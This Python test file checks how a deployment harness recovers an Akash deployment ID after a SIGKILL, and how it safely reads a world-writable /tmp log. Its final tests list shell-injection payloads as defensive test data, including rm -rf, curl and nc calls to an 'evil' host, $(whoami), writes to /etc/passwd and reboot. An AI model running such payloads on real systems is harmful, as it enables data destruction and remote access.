"""#278: a deployment the run that created it cannot name.

⛔ WHY THESE EXERCISE A REAL SUBPROCESS. The claim under test is about what
survives SIGKILL, and SIGKILL is precisely the thing no in-process fake can
model: a mock that "raises TimeoutExpired" proves nothing about whether the
child's handlers ran, whether its output was flushed, or what type the exception
carries. Each test below kills a real process and reads what is actually left.
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
import textwrap
from pathlib import Path

import pytest

from just_akash.test_shell_e2e import _DSEQ_ANY_RE, _DSEQ_SUMMARY_RE, _decoded

#: Long enough that the child is still alive when the parent gives up, short
#: enough that a hung test is a failed test rather than a hung suite.
_CHILD_LIFETIME = 30
_PARENT_PATIENCE = 2


def _kill_after_timeout(child_source: str) -> subprocess.TimeoutExpired:
    """Run a child that outlives the parent's patience; return the raised timeout."""
    with tempfile.TemporaryDirectory() as td:
        script = Path(td) / "child.py"
        script.write_text(textwrap.dedent(child_source), encoding="utf-8")
        try:
            subprocess.run(
                [sys.executable, str(script)],
                capture_output=True,
                text=True,
                timeout=_PARENT_PATIENCE,
            )
        except subprocess.TimeoutExpired as exc:
            return exc
    raise AssertionError("the child exited on its own — it must outlive the timeout")


def test_a_sigkilled_child_still_yields_the_dseq_it_flushed():
    """The identifier was in hand and thrown away.

    `TimeoutExpired` carries the output flushed before the kill. deploy.py's
    `_log` prints with flush=True, so `Deployment created  DSEQ=N` reaches the
    parent even when the child is killed mid-deploy. Recovering it is the
    difference between a deployment that can be closed and one that cannot be
    named at all.
    """
    exc = _kill_after_timeout(f"""
        import time
        print("[ts] Deployment created  DSEQ=1788999000111  manifest_len=42", flush=True)
        time.sleep({_CHILD_LIFETIME})
    """)
    output = _decoded(exc.stdout) + _decoded(exc.stderr)
    assert _DSEQ_ANY_RE.findall(output) == ["1788999000111"], (
        f"the flushed DSEQ did not survive the kill; got {output!r}"
    )


def test_the_timeout_carries_bytes_even_though_the_call_asked_for_text():
    """⛔ AN OBSERVATION OF CURRENT CPython, and deliberately so.

    `subprocess.run(..., text=True, timeout=N)` raises with `.stdout` as BYTES.
    That is an implementation detail rather than a documented contract — and it
    is the entire reason `_decoded` exists, so pinning it is the point. If this
    test ever fails, nothing here is broken: CPython changed and `_decoded`'s
    motivation has evaporated, so read it as "the platform moved", not as "we
    regressed". The behaviour `_decoded` must actually guarantee is pinned
    separately by `test_decoded_accepts_every_shape_it_can_be_handed`, which
    does not depend on this detail at all.

    Both failure modes it guards are silent: `exc.stdout + exc.stderr` is a
    TypeError, and a `str` pattern over bytes matches nothing. Each looks like
    "the deployment had no DSEQ" — a claim about the deployment rather than
    about the plumbing.
    """
    exc = _kill_after_timeout(f"""
        import time
        print("DSEQ=1788999000222", flush=True)
        time.sleep({_CHILD_LIFETIME})
    """)
    assert isinstance(exc.stdout, bytes), (
        "TimeoutExpired.stdout is no longer bytes — if it is now str, _decoded is "
        "harmless, but the comment explaining why it exists has become false"
    )
    assert _decoded(exc.stdout).startswith("DSEQ=1788999000222")
    assert _decoded(None) == ""


def test_decoded_accepts_every_shape_it_can_be_handed():
    """The contract, independent of how CPython happens to type the exception.

    This is the half that must keep passing whatever the platform does: bytes
    decode, str passes through, absent streams become empty rather than the
    string "None" — which would otherwise be searched for a DSEQ and quietly
    match nothing. Undecodable bytes must not raise: losing the whole output to
    a UnicodeDecodeError would discard the identifier for a reason that has
    nothing to do with the deployment.
    """
    assert _decoded(b"DSEQ=1") == "DSEQ=1"
    assert _decoded("DSEQ=1") == "DSEQ=1"
    assert _decoded(bytearray(b"DSEQ=1")) == "DSEQ=1"
    assert _decoded(None) == ""
    assert "\ufffd" in _decoded(b"DSEQ=1 \xff\xfe"), "undecodable bytes must not raise"


def test_the_child_is_given_no_chance_to_clean_up_after_itself():
    """⛔ THE PREMISE OF #278, pinned rather than asserted in prose.

    deploy.py has SEVEN internal cleanup sites and the lease-failure one even
    logs the DSEQ when its own close fails — so the ordinary failure path is
    well covered, and someone reading #278 could reasonably conclude the issue
    is already fixed. It is not, because on THIS path none of that code runs.

    `subprocess.run(timeout=)` calls `Popen.kill()`, which is SIGKILL on POSIX
    and cannot be caught, blocked or handled. A child holding every hook Python
    offers gets none of them.
    """
    with tempfile.TemporaryDirectory() as td:
        marks = Path(td) / "marks.txt"
        exc = _kill_after_timeout(f"""
            import atexit, signal, sys, time
            def note(tag):
                with open({str(marks)!r}, "a") as fh:
                    fh.write(tag + "\\n")
            atexit.register(lambda: note("ATEXIT"))
            for s in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP):
                signal.signal(s, lambda n, f: note("CAUGHT"))
            try:
                note("STARTED")
                sys.stdout.flush()
                time.sleep({_CHILD_LIFETIME})
            finally:
                note("FINALLY")
        """)
        assert exc is not None
        ran = marks.read_text(encoding="utf-8").split() if marks.exists() else []
    assert ran == ["STARTED"], (
        f"the child ran cleanup after SIGKILL, which is impossible — got {ran!r}. "
        "If this ever passes with more than STARTED, the kill is no longer SIGKILL "
        "and #278's whole premise needs re-deriving."
    )


def test_the_success_pattern_is_not_widened_to_the_redeploy_line():
    """⛔ The wider pattern must stay OFF the success path.

    deploy.py emits `DSEQ=` when a deployment is created (:1104) and again for a
    re-deploy round (:1928), then prints the authoritative `DSEQ: ` summary last
    (:2116). A first-match search over the wider pattern therefore names the
    SUPERSEDED deployment. Widening one pattern and reusing it everywhere is the
    obvious tidy-up and it silently closes the wrong thing.
    """
    output = (
        "[ts] Deployment created  DSEQ=111  manifest_len=9\n"
        "[ts] Re-deployed: new order DSEQ=222 — fast-polling for fresh bids...\n"
        "  DSEQ: 222\n"
    )
    summary = _DSEQ_SUMMARY_RE.search(output)
    wider = _DSEQ_ANY_RE.search(output)
    assert summary is not None and wider is not None, "both patterns must still match"
    assert summary.group(1) == "222", (
        "the summary pattern no longer selects the authoritative summary line"
    )
    assert wider.group(1) == "111", (
        "the wider pattern's FIRST match is the superseded DSEQ — this is exactly "
        "why it is confined to the failure path, where no summary line exists"
    )


# ── the mechanism works; these pin that step 2 actually USES it ──────────────
# The deploy step cannot be executed in a unit test — it needs live Akash creds and
# spends real escrow — so its wiring is asserted structurally, the way this repo
# already pins un-runnable workflow code.

import ast  # noqa: E402

_SRC = (Path(__file__).resolve().parents[1] / "just_akash" / "test_shell_e2e.py").read_text(
    encoding="utf-8"
)
_TREE = ast.parse(_SRC)
_PARENT: dict = {}
for _n in ast.walk(_TREE):
    for _c in ast.iter_child_nodes(_n):
        _PARENT[_c] = _n


def _ancestors(node):
    while node in _PARENT:
        node = _PARENT[node]
        yield node


def _deploy_call():
    for n in ast.walk(_TREE):
        if (
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Name)
            and n.func.id == "run"
            and "just up" in (ast.get_source_segment(_SRC, n) or "")
        ):
            return n
    return None


def test_the_deploy_call_cannot_escape_uncaught():
    """The exception escaped before the DSEQ was parsed AND before the cleanup.

    Two things must hold together: the call is inside a `try`, and that `try`
    names TimeoutExpired. A bare `except Exception` would satisfy the first and
    silently swallow the thing this is about.
    """
    call = _deploy_call()
    assert call is not None, "the `just up` deploy call moved — re-anchor, do not delete"
    tries = [a for a in _ancestors(call) if isinstance(a, ast.Try)]
    assert tries, "the deploy call is not inside a try — a timeout escapes the whole run"
    handler_src = " ".join(ast.get_source_segment(_SRC, h) or "" for h in tries[0].handlers)
    assert "TimeoutExpired" in handler_src, (
        "the enclosing try does not name TimeoutExpired, so a SIGKILLed deploy still "
        "escapes before the DSEQ is parsed"
    )
    assert "_decoded" in handler_src, (
        "the handler does not run the child's output through _decoded — "
        "TimeoutExpired carries BYTES, so the DSEQ is discarded on a type mismatch"
    )


def test_every_dseq_less_exit_reports_the_unnamed_deployment():
    """A `sys.exit(1)` that leaves no identifier must say so.

    Both DSEQ-less exits in step 2 are the whole issue: the run stops, and unless
    it states the window, nothing anywhere points at what it may have created.
    """
    fn = next(n for n in ast.walk(_TREE) if isinstance(n, ast.FunctionDef) and n.name == "main")
    reports = [
        n
        for n in ast.walk(fn)
        if isinstance(n, ast.Call)
        and isinstance(n.func, ast.Name)
        and n.func.id == "report_unnamed_deployment"
    ]
    assert len(reports) == 2, (
        f"expected the report on BOTH DSEQ-less exits, found {len(reports)} — the "
        "rc!=0-with-nothing-recovered path and the unparsable-output path"
    )


def test_the_report_states_the_window_and_closes_nothing():
    """⛔ ESCROW BOUNDARY, pinned in the structure rather than trusted to review.

    The harness may destroy a deployment it created AND can identify. One it
    cannot identify is not its to guess at: the Console listing is not scoped
    server-side, so "close what looks unowned" closes other people's. Reporting
    is the whole remit of this function and it must stay that way.
    """
    fn = next(
        n
        for n in ast.walk(_TREE)
        if isinstance(n, ast.FunctionDef) and n.name == "report_unnamed_deployment"
    )
    # ⛔ CALLS, not a substring over the source. The first version of this test
    # searched the text and fired on the word "destroy" in this function's own
    # DOCSTRING — a guard that goes red for prose while a real call could be spelled
    # any number of ways it never checks. Break the code, not the commentary.
    called = {
        n.func.id if isinstance(n.func, ast.Name) else getattr(n.func, "attr", "")
        for n in ast.walk(fn)
        if isinstance(n, ast.Call)
    }
    closers = {c for c in called if "destroy" in c or "close" in c}
    assert not closers, (
        f"report_unnamed_deployment calls {sorted(closers)} — it reports a window it "
        "cannot resolve, and closing an unidentified deployment closes someone else's"
    )
    assert "created-between" in (ast.get_source_segment(_SRC, fn) or ""), (
        "the report no longer states a time window, which is the only thing that makes "
        "an unnamed deployment findable by a later owner-scoped chain query"
    )


# ── the durable copy: `just up` tees the deploy to a fixed path ──────────────

import os  # noqa: E402
import time  # noqa: E402

from just_akash import test_shell_e2e as _tse  # noqa: E402


def _tee_log(monkeypatch, tmp_path, content: str | None, *, age: float = 0.0):
    """Point the module at a temp tee-log, optionally aged into the past."""
    path = tmp_path / "akash-last-deploy.log"
    if content is not None:
        path.write_text(content, encoding="utf-8")
        if age:
            past = time.time() - age
            os.utime(path, (past, past))
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(path))
    return path


def test_the_dseq_is_recovered_from_the_file_when_the_pipe_gave_nothing(monkeypatch, tmp_path):
    """The identifier was on disk the whole time; the run simply never looked."""
    _tee_log(monkeypatch, tmp_path, "[ts] Deployment created  DSEQ=1788999000333  x\n")
    assert _tse._dseq_from_deploy_log(time.time() - 5, wait=0.0) == "1788999000333"


def test_a_tee_log_older_than_this_run_is_treated_as_no_log_at_all(monkeypatch, tmp_path):
    """⛔ THE STALENESS GUARD, and it is the dangerous one.

    The path is FIXED, so a previous `just up` leaves a complete, well-formed,
    entirely wrong file. Without an mtime check this function would confidently
    return another run's DSEQ — which the caller then hands to `robust_destroy`.
    Recovering the wrong identifier is worse than recovering none: it closes a
    live deployment and reports success while doing it.
    """
    _tee_log(monkeypatch, tmp_path, "DSEQ=1111111111111\n", age=3600)
    assert _tse._dseq_from_deploy_log(time.time(), wait=0.0) is None


def test_an_ambiguous_tee_log_names_nothing(monkeypatch, tmp_path):
    """A re-deploy round supersedes an earlier DSEQ; the file cannot say which is live."""
    _tee_log(
        monkeypatch,
        tmp_path,
        "Deployment created  DSEQ=111\nRe-deployed: new order DSEQ=222\n",
    )
    assert _tse._dseq_from_deploy_log(time.time() - 5, wait=0.0) is None


def test_a_missing_tee_log_is_not_an_error(monkeypatch, tmp_path):
    """The deploy may have died before `tee` ever created the file."""
    _tee_log(monkeypatch, tmp_path, None)
    assert _tse._dseq_from_deploy_log(time.time(), wait=0.0) is None


def test_it_waits_because_the_deploy_outlives_the_run_that_gave_up(monkeypatch, tmp_path):
    """⛔ Reading once would read the file at its least complete.

    The timeout kills only the direct child, so the deploy keeps running and keeps
    writing. A file that has no DSEQ at the instant of the timeout may well have one
    a second later — which is the difference between a closable deployment and an
    unnamed one.
    """
    path = _tee_log(monkeypatch, tmp_path, "no dseq yet\n")
    started = time.time() - 5

    import threading

    def append_later():
        time.sleep(0.5)
        path.write_text("Deployment created  DSEQ=1788999000444\n", encoding="utf-8")

    threading.Thread(target=append_later, daemon=True).start()
    assert _tse._dseq_from_deploy_log(started, wait=5.0) == "1788999000444"


def test_a_file_newer_than_this_run_is_not_thereby_this_runs(monkeypatch, tmp_path):
    """⛔ THE mtime GUARD PROVES ONE DIRECTION AND THE CALLER WANTS THE OTHER.

    `mtime >= started_at` rules out a file OLDER than this run. It cannot establish
    that a NEWER file belongs to this run — and this repo's own abandoned-grandchild
    behaviour is the counterexample:

        T1  run A times out, abandons its grandchild
        T2  run B starts                        started_at = T2
        T3  run A's grandchild writes DSEQ_A    mtime = T3 > T2  -> looks FRESH
        T4  run B recovers DSEQ_A

    Overlapping E2E runs are an observed state here, not a hypothetical.

    ⚠ THIS TEST PASSES, AND THAT IS THE POINT. It asserts the limit rather than a
    fix: nothing available at T4 can tell DSEQ_A from ours, because we are only on
    this path when this run's own output produced nothing to corroborate against.
    The safety therefore cannot live here — it lives in what the caller DOES with
    the answer, which `test_a_recovered_dseq_is_reported_and_never_destroyed` pins.
    """
    started = time.time()
    # a previous run's deploy, still alive, writes AFTER we started
    _tee_log(monkeypatch, tmp_path, "Deployment created  DSEQ=9999999999999\n")
    assert _tse._dseq_from_deploy_log(started, wait=0.0) == "9999999999999", (
        "recovery is expected to return the foreign DSEQ — if this now returns None, "
        "provenance became establishable and the report-only rule can be revisited"
    )


def test_a_recovered_dseq_is_reported_and_never_destroyed():
    """⛔ THE ESCROW BOUNDARY, where the previous test proves it has to be.

    Recovery yields a candidate whose provenance cannot be established. Closing the
    wrong one is worse than closing none: it takes down a live deployment belonging
    to another run and reports success. So the recovered value must reach the report
    and must not reach `robust_destroy` — nor `dseq_ref`, which is what BOTH the
    destroy branch and the SIGINT handler act on.

    An earlier revision of this PR assigned it straight into `dseq_ref["dseq"]`, so
    it took the destroy branch while the PR description said "reports, never closes".
    """
    fn = next(n for n in ast.walk(_TREE) if isinstance(n, ast.FunctionDef) and n.name == "main")
    assigns = [
        n
        for n in ast.walk(fn)
        if isinstance(n, ast.Assign)
        and isinstance(n.value, ast.Call)
        and isinstance(n.value.func, ast.Name)
        and n.value.func.id == "_dseq_from_deploy_log"
    ]
    assert len(assigns) == 1, f"expected one recovery call, found {len(assigns)}"
    target = assigns[0].targets[0]
    assert isinstance(target, ast.Name), (
        "the recovered DSEQ is assigned into a subscript — if that is dseq_ref, it "
        "arms both the destroy branch and the signal handler against an unverified id"
    )
    name = target.id

    def _args_of(callee: str) -> set[str]:
        out: set[str] = set()
        for n in ast.walk(fn):
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == callee:
                out |= {a.id for a in n.args if isinstance(a, ast.Name)}
        return out

    assert name in _args_of("report_unnamed_deployment"), (
        f"{name!r} never reaches the report — recovering the DSEQ and then not saying "
        "it is the same as not recovering it"
    )
    assert name not in _args_of("robust_destroy"), (
        f"{name!r} is passed to robust_destroy — a candidate from a shared fixed path "
        "is not an identification and must not authorise closing anything"
    )
    assigned_into_ref = [
        n
        for n in ast.walk(fn)
        if isinstance(n, ast.Assign)
        and any(
            isinstance(t, ast.Subscript)
            and isinstance(t.value, ast.Name)
            and t.value.id == "dseq_ref"
            for t in n.targets
        )
        and isinstance(n.value, ast.Name)
        and n.value.id == name
    ]
    assert not assigned_into_ref, (
        f"{name!r} is written into dseq_ref, which the destroy branch and the SIGINT "
        "handler both act on"
    )


def test_the_timeout_returncode_names_the_signal_that_was_actually_sent():
    """⛔ A NEGATIVE RETURNCODE IS A CLAIM ABOUT A CAUSE, not a spare slot.

    By convention a negative returncode is `-signal`, so the `-1` this once
    carried decodes to SIGHUP — naming a cause that did not happen, in a value
    almost nobody thinks to decode. `subprocess.run` kills a timed-out child
    with `Popen.kill()`; measured, that child's returncode is -9. We are not
    inferring what killed it, we sent it.

    Pinned as an expression over `signal.SIGKILL` rather than the literal -9, so
    the code states the cause instead of encoding it.
    """
    # ⛔ THE ASSIGNED VALUE, not the handler's text. The first version of this test
    # searched the source for "SIGKILL" and passed with `returncode = -1` restored,
    # because the log_fail one line above says "was SIGKILLed". A guard satisfied by
    # the prose beside the code is not a guard on the code.
    assigns = []
    for n in ast.walk(_TREE):
        if not isinstance(n, ast.Try):
            continue
        for h in n.handlers:
            if "TimeoutExpired" not in (ast.get_source_segment(_SRC, h) or ""):
                continue
            for inner in ast.walk(h):
                if isinstance(inner, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id == "returncode" for t in inner.targets
                ):
                    assigns.append(inner)
    assert assigns, "no timeout handler assigns a returncode — re-anchor, do not delete"
    for a in assigns:
        names = {
            m.attr if isinstance(m, ast.Attribute) else getattr(m, "id", "")
            for m in ast.walk(a.value)
        }
        assert "SIGKILL" in names, (
            "the timeout returncode is not derived from signal.SIGKILL; a bare "
            f"negative literal asserts whichever signal it decodes to (-1 is SIGHUP) "
            f"— got {ast.unparse(a.value)!r}, a cause that did not happen"
        )


# ── review round 2: the seam, the untrusted path, and a message that lied ────

import threading  # noqa: E402

from just_akash.test_shell_e2e import _findall_streams, _search_streams  # noqa: E402


def test_a_dseq_cannot_be_fabricated_across_the_stdout_stderr_seam():
    """⛔ CONCATENATION INVENTS BYTE RANGES NO WRITER EMITTED.

    SIGKILL cuts stdout wherever it lands, so "stdout truncated mid-`DSEQ=`" is not
    an exotic input — it is the exact state this recovery path exists to handle. Join
    it to a stderr that happens to begin with digits and the pattern matches a number
    **neither stream produced**. On the failure path that invented value would land in
    dseq_ref and reach `robust_destroy`. (Reported by CodeRabbit on #279.)

    The invariant, stated generally: a match must come from a byte range that one
    writer actually produced.
    """
    out = "…deploying\n[2026-09-06T18:00:00Z] DSEQ="
    err = "1788999999 is not a valid provider\n"

    assert _DSEQ_ANY_RE.findall(out + err) == ["1788999999"], (
        "the seam no longer fabricates — if the inputs changed, re-derive this test "
        "rather than deleting it; it documents why the streams are kept apart"
    )
    assert _findall_streams(_DSEQ_ANY_RE, out, err) == [], (
        "a DSEQ was matched across the stream boundary; it belongs to neither writer"
    )
    assert _search_streams(_DSEQ_SUMMARY_RE, out, err) is None
    # and a genuine match in either stream is still found
    assert _findall_streams(_DSEQ_ANY_RE, "DSEQ=111", "noise") == ["111"]
    assert _findall_streams(_DSEQ_ANY_RE, "noise", "  DSEQ: 222") == ["222"]


def test_a_fifo_at_the_tee_path_cannot_wedge_the_recovery(monkeypatch, tmp_path):
    """⛔ A PLAIN open() ON A FIFO BLOCKS FOREVER.

    `/tmp/.akash-last-deploy.log` is a world-writable fixed path. A FIFO planted
    there turns a recovery attempt into a hang — which is worse than failing to
    recover, because the run never ends to report anything at all.

    ⚠ Run in a thread with a join timeout ON PURPOSE: without O_NONBLOCK this
    regression HANGS rather than fails, and a hung suite reports nothing useful.
    A test for a blocking bug must not be able to block.
    """
    fifo = tmp_path / "akash-last-deploy.log"
    os.mkfifo(fifo)
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(fifo))

    result: list[tuple[str, ...]] = []
    t = threading.Thread(target=lambda: result.append(_tse._read_tee_log(0.0)), daemon=True)
    t.start()
    t.join(timeout=10)
    assert not t.is_alive(), (
        "the read blocked on a FIFO — O_NONBLOCK is gone, and this path can now wedge "
        "a run instead of failing it"
    )
    assert result == [()], "a FIFO is not a regular file and must read as no file"


def test_a_symlink_at_the_tee_path_is_refused(monkeypatch, tmp_path):
    """O_NOFOLLOW: the path is world-writable, so the file it names is not ours."""
    real = tmp_path / "elsewhere.log"
    real.write_text("Deployment created  DSEQ=7777777777777\n", encoding="utf-8")
    link = tmp_path / "akash-last-deploy.log"
    link.symlink_to(real)
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(link))
    assert _tse._read_tee_log(0.0) == (), (
        "a symlink was followed — the read went somewhere this run did not write"
    )


def test_a_directory_at_the_tee_path_is_not_a_log(monkeypatch, tmp_path):
    """S_ISREG covers the shapes O_NOFOLLOW does not."""
    d = tmp_path / "akash-last-deploy.log"
    d.mkdir()
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(d))
    assert _tse._read_tee_log(0.0) == ()


def test_a_second_dseq_arriving_late_is_still_seen_as_ambiguous(monkeypatch, tmp_path):
    """⛔ RETURNING ON THE FIRST UNIQUE HIT NEVER OBSERVES THE AMBIGUITY.

    The premise of this whole helper is that the deploy is STILL WRITING, so a
    re-deploy round's second DSEQ can arrive inside the same wait window. Returning
    early made the ambiguity refusal depend on timing — and a guard that fires
    sometimes is worse than one that never fires, because a green run says nothing
    about the next one. (Reported by CodeRabbit on #279.)
    """
    path = _tee_log(monkeypatch, tmp_path, "Deployment created  DSEQ=111\n")
    started = time.time() - 5

    def supersede():
        time.sleep(0.5)
        path.write_text(
            "Deployment created  DSEQ=111\nRe-deployed: new order DSEQ=222\n",
            encoding="utf-8",
        )

    threading.Thread(target=supersede, daemon=True).start()
    assert _tse._dseq_from_deploy_log(started, wait=3.0) is None, (
        "the late second DSEQ was never observed — recovery returned before the "
        "window closed, so which answer you get depends on timing"
    )


def test_the_timeout_message_does_not_claim_the_deploy_is_dead():
    """⛔ A WRONG LINE IN A LOG OUTLIVES A WRONG LINE IN CODE — nobody diffs it.

    This message used to say "none of its own cleanup ran". The measurement that
    motivates this entire PR says the opposite: only the DIRECT child is SIGKILLed,
    and the deploy one level below survives, so its cleanup may well run. The
    sentence taught the next reader precisely the false model the rest of the change
    exists to correct. (Reported by Copilot on #279.)
    """
    # ⛔ THE ASSEMBLED STRING, not the source text. The first version of this test
    # grepped the handler's source and failed on a CORRECT message, because the
    # sentence is split across two adjacent string literals — "may still be " then
    # "running". Reading the file as text asks a question about the source; the
    # subject here is the message, so join the constants the parser produced.
    handler_node = next(
        h
        for n in ast.walk(_TREE)
        if isinstance(n, ast.Try)
        for h in n.handlers
        if "TimeoutExpired" in (ast.get_source_segment(_SRC, h) or "")
    )
    handler = "".join(
        c.value
        for c in ast.walk(handler_node)
        if isinstance(c, ast.Constant) and isinstance(c.value, str)
    )
    assert "none of its own cleanup ran" not in handler, (
        "the timeout message asserts the deploy's cleanup did not run; the grandchild "
        "survives the kill, so that is a claim this PR's own measurement refutes"
    )
    assert "may still be running" in handler, (
        "the timeout message no longer says the deploy may still be running, which is "
        "the fact that makes an unattended deployment possible in the first place"
    )


def test_the_patterns_are_never_applied_to_a_joined_stream():
    """⛔ The helpers are only worth having if the call sites use them.

    `test_a_dseq_cannot_be_fabricated_across_the_stdout_stderr_seam` proves
    `_search_streams`/`_findall_streams` are safe. It says nothing about whether
    `main` still calls `.search(output)` on the concatenation — which is the actual
    defect. Pin the call sites, not just the helper.
    """
    fn = next(n for n in ast.walk(_TREE) if isinstance(n, ast.FunctionDef) and n.name == "main")
    offenders = []
    for n in ast.walk(fn):
        if (
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Attribute)
            and n.func.attr in {"search", "findall", "finditer", "match"}
            and isinstance(n.func.value, ast.Name)
            and n.func.value.id.startswith("_DSEQ")
        ):
            offenders.append(ast.unparse(n))
    assert not offenders, (
        f"a DSEQ pattern is applied directly in main ({offenders}) — it must go "
        "through _search_streams/_findall_streams, or a match can be fabricated "
        "across the stdout/stderr seam"
    )


def test_a_fifo_with_a_writer_cannot_feed_us_a_dseq(monkeypatch, tmp_path):
    """A live FIFO planted at the world-writable path cannot feed us a DSEQ.

    `/tmp` is world-writable, so anyone can plant a FIFO here and write to it. This
    asserts the outcome that matters: whatever they send, the recovery reads nothing
    and reports no candidate.

    ⚠ IT DOES NOT ISOLATE `S_ISREG`, and I am not going to pretend otherwise.
    Measured: deleting that check leaves every test here green, because `O_NONBLOCK`
    already makes the FIFO read raise `BlockingIOError` and a directory raise
    `IsADirectoryError` — both caught, both returning "". The type check has no
    reachable unique contribution on this platform. It is kept as defence in depth
    (see `_read_tee_log`), not because anything here proves it fires.
    """
    fifo = tmp_path / "akash-last-deploy.log"
    os.mkfifo(fifo)
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(fifo))

    stop = threading.Event()

    def feed():
        # opening for write blocks until a reader arrives; if none does, give up
        try:
            fd = os.open(str(fifo), os.O_WRONLY | os.O_NONBLOCK)
        except OSError:
            return
        try:
            while not stop.is_set():
                try:
                    os.write(fd, b"Deployment created  DSEQ=6666666666666\n")
                except OSError:
                    return
                time.sleep(0.02)
        finally:
            os.close(fd)

    writer = threading.Thread(target=feed, daemon=True)
    writer.start()
    try:
        result: list[tuple[str, ...]] = []
        t = threading.Thread(target=lambda: result.append(_tse._read_tee_log(0.0)), daemon=True)
        t.start()
        t.join(timeout=10)
        assert not t.is_alive(), "the read blocked on a live FIFO"
    finally:
        stop.set()
        writer.join(timeout=2)

    assert result == [()], (
        f"read {result!r} from a FIFO — content supplied by whoever planted it at a "
        "world-writable path was about to be scanned for a DSEQ and reported as ours"
    )


# ── review round 3: two correct fixes composed into an unbounded cost ────────


def test_an_oversized_tee_log_is_read_bounded_and_in_two_pieces(monkeypatch, tmp_path):
    """⛔ THE DEFECT WAS THE INTERACTION, not either change.

    `fh.read()` on a world-writable path was already unbounded. Then the
    accumulate-to-the-deadline fix — correct on its own, and the right answer to a
    non-deterministic ambiguity check — turned one unbounded read into one PER
    SECOND until the deadline. Neither change is wrong alone; their product is.

    Bounded now, and the bound is checked against a file far larger than the limit.
    """
    path = tmp_path / "akash-last-deploy.log"
    limit = _tse._TEE_READ_LIMIT
    filler = b"x" * (limit * 2)
    path.write_bytes(b"HEAD DSEQ=1111111111111\n" + filler + b"\nTAIL DSEQ=2222222222222\n")
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(path))

    segments = _tse._read_tee_log(time.time() - 5)
    assert len(segments) == 2, "an oversized file must come back as head and tail"
    assert sum(len(seg) for seg in segments) <= limit + 1, (
        f"read {sum(len(seg) for seg in segments)} chars from a "
        f"{path.stat().st_size}-byte file; the bound is not holding"
    )
    # both ends are still reachable: a DSEQ written late by the still-running deploy
    # is exactly the case this recovery exists for, so a head-only bound would miss it
    found = set(_findall_streams(_DSEQ_ANY_RE, *segments))
    assert found == {"1111111111111", "2222222222222"}, f"lost an end: {found}"


def test_the_head_and_tail_are_never_joined(monkeypatch, tmp_path):
    """⛔ THE SAME SEAM, ONE LAYER DOWN.

    Joining head and tail — with or without a sentinel — invents a byte range no
    writer produced, which is the defect already closed at the stdout/stderr join.
    A sentinel would hold only until someone widened the pattern to match across it;
    returning the pieces apart cannot be undone by an edit to the regex.
    """
    path = tmp_path / "akash-last-deploy.log"
    limit = _tse._TEE_READ_LIMIT
    half = limit // 2
    # The cut points are exact: the head's LAST bytes are "DSEQ=" and the tail's FIRST
    # bytes are digits, so the two pieces abut into a number present in neither.
    head_seg = b"x" * (half - 5) + b"DSEQ="
    tail_seg = b"9999999999" + b"z" * (half - 10)
    path.write_bytes(head_seg + b"m" * 1000 + tail_seg)
    monkeypatch.setattr(_tse, "_DEPLOY_TEE_LOG", str(path))
    segments = _tse._read_tee_log(time.time() - 5)
    assert len(segments) == 2

    assert _DSEQ_ANY_RE.findall("".join(segments)) == ["9999999999"], (
        "the joined form no longer fabricates — re-derive this fixture rather than "
        "deleting it; it documents why the pieces are kept apart"
    )
    assert _findall_streams(_DSEQ_ANY_RE, *segments) == [], (
        "a DSEQ was matched across the truncation cut — it belongs to no writer"
    )


def test_a_normal_sized_tee_log_still_comes_back_whole(monkeypatch, tmp_path):
    """The bound must not change the ordinary case: one segment, everything in it."""
    _tee_log(monkeypatch, tmp_path, "Deployment created  DSEQ=1788999000555\n")
    segments = _tse._read_tee_log(time.time() - 5)
    assert len(segments) == 1, "a small file was split; the bound is firing too early"
    assert _findall_streams(_DSEQ_ANY_RE, *segments) == ["1788999000555"]


# ── the digits-only capture is a shell-injection barrier ─────────────────────

_SHELL_PAYLOADS = [
    "DSEQ=1; rm -rf /tmp/pwned",
    "DSEQ: 1 && curl http://evil/",
    "DSEQ=$(whoami)",
    "DSEQ=`id`",
    "DSEQ=1|nc evil 1234",
    "DSEQ=1 > /etc/passwd",
    "DSEQ='; touch /tmp/pwned; '",
    "DSEQ=../../../etc/passwd",
    "DSEQ=1\nDSEQ=2; reboot",
]


@pytest.mark.parametrize("payload", _SHELL_PAYLOADS)
def test_the_dseq_capture_is_digits_only_because_it_reaches_a_shell(payload):
    """⛔ `(\\d+)` IS THE WHOLE BARRIER BETWEEN PARSED OUTPUT AND `shell=True`.

    The captured DSEQ is interpolated UNQUOTED into every
    `run(f"uv run just-akash ... --dseq {dseq} ...")` in `main` (`run` passes
    shell=True), and into the `verify it is ours before closing:` line in
    `report_unnamed_deployment` — which prints a command for a HUMAN to paste into
    their own terminal, so it runs with their privileges rather than CI's.

    Anchored by symbol rather than line number: the first version cited lines that
    were already wrong when written, because adding the note shifted them.

    ⚠ THIS PR WIDENS DSEQ EXTRACTION, which makes the dangerous edit the natural
    one: the first time a DSEQ appears in an unexpected shape, `(\\d+)` -> `(\\S+)`
    looks like a one-character generalisation. It would turn a world-writable /tmp
    file into shell input. Before this test, nothing in the suite went red for it.

    Asserted behaviourally — every capture from every pattern must be digits — so it
    holds however the pattern is spelled, rather than pinning one spelling.
    """
    for name, pattern in (("_DSEQ_SUMMARY_RE", _DSEQ_SUMMARY_RE), ("_DSEQ_ANY_RE", _DSEQ_ANY_RE)):
        for capture in pattern.findall(payload):
            assert capture.isdigit(), (
                f"{name} captured {capture!r} from {payload!r} — a non-digit capture "
                'is interpolated unquoted into every `run(f"uv run just-akash ... '
                '{dseq} ...")` in main, which passes shell=True'
            )


def test_the_tmp_derived_candidate_never_reaches_a_shell_interpolation():
    """⛔ The value read from a WORLD-WRITABLE path must not reach `shell=True`.

    `recovered_dseq` comes from `/tmp/.akash-last-deploy.log`, which anyone can
    write. It was kept out of `dseq_ref` so an unverified candidate could not reach
    `robust_destroy` — and that same containment is what keeps it away from the six
    shell interpolations, which all read `dseq`, derived only from `dseq_ref`.

